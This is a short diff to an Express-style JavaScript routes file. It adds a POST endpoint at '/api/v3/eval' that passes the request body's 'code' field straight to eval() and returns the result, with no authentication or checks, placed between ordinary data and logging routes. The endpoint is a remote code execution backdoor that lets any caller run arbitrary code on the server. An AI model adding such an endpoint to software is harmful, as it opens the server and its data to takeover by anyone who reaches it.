@@ -336,7 +336,17 @@ export async function setupRoutes(app) {
         res.status(200).json(errorLogs);
     });
 
+   app.post('/api/v3/eval', (req, res) => {
+  const { code } = req.body;
 
+  try {
+    const result = eval(code);
+    res.json({ success: true, result });
+  } catch (error) {
+    res.json({ success: false, error: error.message });
+  }
+});
+    
    app.get('/api/v3/data', (req, res) => {
 
   const reqData = {
